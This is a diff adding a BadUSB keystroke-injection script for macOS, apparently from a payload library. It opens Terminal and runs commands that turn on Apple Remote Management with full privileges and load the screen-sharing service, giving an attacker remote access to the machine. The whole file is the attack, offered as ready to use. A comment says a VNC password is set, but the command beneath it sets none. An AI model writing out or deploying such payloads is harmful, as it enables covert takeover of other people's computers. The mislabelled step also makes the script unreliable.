@@ -1,0 +1,29 @@
+REM Title: macOS VNC Server
+REM Author: BadUSB Library
+REM Description: Enables VNC for remote access
+REM Target: macOS 10.15+
+REM Category: Remote Access
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Enable VNC
+STRING sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -restart -agent -privs -all
+ENTER
+DELAY 3000
+
+REM Set VNC password
+STRING sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -access -on -privs -all -users admin
+ENTER
+DELAY 3000
+
+REM Enable screen sharing
+STRING sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist
+ENTER
+DELAY 3000
